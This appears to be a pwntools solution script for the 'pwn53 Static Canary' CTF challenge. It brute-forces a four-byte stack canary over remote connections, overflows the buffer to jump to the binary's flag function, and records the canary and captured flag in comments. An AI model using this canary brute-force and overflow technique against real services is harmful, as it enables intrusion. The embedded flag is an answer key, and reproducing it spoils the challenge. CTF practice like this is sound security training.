#pwn53 Static Canary
from pwn import *

canary = b''
offset = 0x20

for i in range(4):
	for j in range(0x1000):
		p = remote("pwn.challenge.ctf.show", 28234)
		p.sendlineafter(b'>',b'200')
		p.recv()
		payload1 = b'a' * offset + canary + p8(j)
		p.send(payload1)
		ans = p.recv()
		if b'Canary Value Incorrect!' not in ans:
			canary += p8(j)
			print(f"No:{i+1}  {hex(j)}")
			break
		else:
			print(f"try again! {i}:{j}")
		#free
		p.close()
print(f"Canary: {hex(u32(canary))}")
#Canary = 0x21443633
#b'36D!'

p = remote("pwn.challenge.ctf.show", 28234)
elf = ELF('./pwn')
flag_addr = elf.symbols['flag']
payload2 = b'a' * offset + canary + b'a' * 16 + p32(flag_addr)
p.sendlineafter(b'>', b'200')
p.recv()
p.send(payload2)
p.recv()
p.interactive()
#ctfshow{65e50db1-3edd-4257-882f-3fe942c389a5}